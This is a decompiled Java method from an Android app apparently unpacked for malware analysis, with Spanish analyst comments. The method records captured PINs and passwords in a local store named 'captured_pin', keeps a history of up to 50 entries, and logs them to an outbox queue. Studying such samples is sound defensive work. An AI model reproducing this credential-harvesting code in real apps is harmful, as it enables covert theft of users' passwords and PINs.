// FRAGMENTO DECOMPILADO; no es una clase independiente compilable.
// Mantiene un historial. El while limita el historial a 50 entradas; no es el envío.
// ev_4cbc2ecc4728b466d570aaeb03ff4cc3fd6cbc943f39e18d34d80229c01dc8e3
// {'path': 'C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk', 'class_name': 'w1.y2', 'method_name': 'w'}

public final void w(long j3, String str, String str2, String str3) {
    String strA = A(j3, str, str2, str3);
    if (strA == null) {
        return;
    }
    if (j3 <= 0) {
        j3 = System.currentTimeMillis();
    }
    String str4 = "[]";
    Context context = this.f5575c;
    SharedPreferences sharedPreferences = context.getSharedPreferences("captured_pin", 0);
    try {
        String string = sharedPreferences.getString("password_history", "[]");
        if (string != null && !string.isEmpty()) {
            str4 = string;
        }
        JSONArray jSONArray = new JSONArray(str4);
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("p", str);
        jSONObject.put("t", j3);
        jSONObject.put("m", str2);
        jSONArray.put(jSONObject);
        while (jSONArray.length() > 50) {
            jSONArray.remove(0);
        }
        sharedPreferences.edit().putString("password_history", jSONArray.toString()).apply();
    } catch (Throwable th) {
        a0.a.p(th, new StringBuilder("history append fail: "), "CredOutbox");
    }
    SharedPreferences.Editor editorEdit = context.getSharedPreferences("captured_pin", 0).edit();
    if ("password".equals(str2)) {
        editorEdit.putString("password", str);
    } else if ("pin".equals(str2)) {
        editorEdit.putString("pin", str);
    }
    editorEdit.apply();
    Log.i("CredOutbox", "commitment enqueued id=" + strA + " mode=" + str2 + " provenance=" + str3 + " len=" + str.length());
}
